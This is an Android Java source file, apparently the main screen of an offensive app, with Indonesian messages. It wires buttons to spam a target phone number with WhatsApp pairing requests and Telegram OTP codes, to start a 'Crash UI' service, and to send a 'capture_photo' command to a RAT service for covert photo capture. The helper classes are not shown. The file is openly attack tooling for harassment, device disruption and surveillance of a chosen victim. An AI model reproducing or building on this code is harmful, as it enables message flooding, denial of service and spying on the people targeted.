package com.manta.x;

import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.view.View;

public class MainActivity extends AppCompatActivity {
    EditText etTarget, etDelay, etCount;
    Button btnSpamWA, btnSpamTele, btnCrashUI, btnRatPhoto;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etTarget = findViewById(R.id.etTarget);
        etDelay = findViewById(R.id.etDelay);
        etCount = findViewById(R.id.etCount);
        btnSpamWA = findViewById(R.id.btnSpamWA);
        btnSpamTele = findViewById(R.id.btnSpamTele);
        btnCrashUI = findViewById(R.id.btnCrashUI);
        btnRatPhoto = findViewById(R.id.btnRatPhoto);

        btnSpamWA.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = etTarget.getText().toString();
                int delay = Integer.parseInt(etDelay.getText().toString());
                int count = Integer.parseInt(etCount.getText().toString());
                SpamPairWA.startSpam(MainActivity.this, target, delay, count);
                Toast.makeText(MainActivity.this, "Spam WA dimulai", Toast.LENGTH_SHORT).show();
            }
        });

        btnSpamTele.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = etTarget.getText().toString();
                SpamTelegram.startSpam(MainActivity.this, target, 3000, 5);
                Toast.makeText(MainActivity.this, "Spam Telegram OTP dimulai", Toast.LENGTH_SHORT).show();
            }
        });

        btnCrashUI.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(MainActivity.this, BugService.class));
                Toast.makeText(MainActivity.this, "Crash UI dijalankan", Toast.LENGTH_SHORT).show();
            }
        });

        btnRatPhoto.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent(MainActivity.this, RatService.class);
                i.putExtra("command", "capture_photo");
                startService(i);
            }
        });
    }
}